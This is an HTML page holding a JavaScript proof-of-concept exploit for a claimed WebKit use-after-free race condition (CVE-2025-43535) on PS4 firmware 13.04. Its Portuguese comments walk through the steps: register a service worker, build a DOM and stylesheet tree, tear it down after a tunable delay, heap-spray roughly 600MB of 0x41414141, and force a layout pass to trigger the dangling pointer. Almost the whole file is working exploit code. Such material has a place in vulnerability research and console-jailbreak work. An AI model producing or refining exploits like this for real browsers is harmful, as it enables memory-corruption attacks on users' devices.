<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535 — UAF / Heap Spray</title>
</head>
<body>
<div>CVE-2025-43535 · UAF Race Condition · PS4 FW 13.04</div>
<div id="log"></div>
<div id="stage" style="position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden"></div>

<script>
"use strict";

const L = (m, c) => {
  const d = document.getElementById('log');
  d.innerHTML += `<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop = d.scrollHeight;
};

// ==========================================
// CONFIGURAÇÃO DO HEAP SPRAY
// ==========================================
// Vamos criar blocos de 4MB preenchidos com o marcador 0x41414141
const SPRAY_CHUNK_SIZE = 1024 * 1024; // 1 Milhão de inteiros de 32-bits = 4MB
const sprayData = new Uint32Array(SPRAY_CHUNK_SIZE);
sprayData.fill(0x41414141); // O ponteiro falso que queremos injetar

const heapSprayArray = [];

function fireHeapSpray() {
  L('INICIANDO HEAP SPRAY! Pulverizando RAM com 0x41414141...', 'warn');
  try {
    // Alocamos cerca de 600MB de dados falsos instantaneamente.
    // O objetivo é ocupar o exato espaço físico na RAM que o WebKit 
    // liberou ao destruirmos a árvore do CSS.
    for (let i = 0; i < 150; i++) { 
      const chunk = new Uint32Array(sprayData);
      heapSprayArray.push(chunk);
    }
    L('Heap Spray concluído: ~600MB alocados em JS.', 'ok');
  } catch (e) {
    L('Heap Spray OOM no JS: ' + e, 'fail');
  }
}

// ==========================================
// LÓGICA DO EXPLOIT (RACE CONDITION)
// ==========================================
// O TEMPO MÁGICO: Isso dita quando vamos puxar o tapete.
// Se for muito alto, o PS4 dá OOM. Se for muito baixo, a árvore não fica profunda o suficiente.
// Leandro, você precisará afinar esse valor (ex: tente 50, 80, 120, 150)
const RACE_TIMEOUT_MS = 95; 

async function run() {
  L('Preparando Race Condition (Bait and Switch)...', 'info');

  if (!('serviceWorker' in navigator)) return;

  try {
    await navigator.serviceWorker.register('sw.js');
    if (!navigator.serviceWorker.controller) {
      setTimeout(() => window.location.reload(), 500);
      return;
    }

    L('Service Worker pronto. Iniciando a isca...', 'ok');

    // 1. A Isca (Cria a árvore complexa)
    const el = document.createElement('div');
    el.className = 't';
    document.getElementById('stage').appendChild(el);

    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = 'payload.css'; 
    document.head.appendChild(link);

    L(`Esperando ${RACE_TIMEOUT_MS}ms para o C++ se afogar na árvore...`, 'warn');

    // 2. A Puxada de Tapete
    setTimeout(() => {
      L('PUXANDO O TAPETE! Deletando DOM e abortando CSS...', 'crash');
      
      // Removemos do DOM. O WebKit tenta limpar os nós C++
      document.head.removeChild(link);
      document.getElementById('stage').innerHTML = ''; 

      // 3. O Heap Spray (Substitui os objetos antigos pelo nosso payload)
      fireHeapSpray();

      // 4. O Gatilho (Força o motor a se recalcular)
      L('Forçando layout global para engatilhar o Dangling Pointer...', 'warn');
      try {
        void document.body.offsetWidth;
      } catch(e) {}

      L('-------------------------------------', 'info');
      L('Se o console crashear AGORA, e os logs do PS4 mostrarem falha', 'crash');
      L('no endereço 0x41414141, VOCÊ CONSEGUIU UM UAF!', 'ok');
      L('-------------------------------------', 'info');

    }, RACE_TIMEOUT_MS);

  } catch (error) {
    L('Erro: ' + error, 'fail');
  }
}

window.addEventListener('load', run);
</script>
</body>
</html>
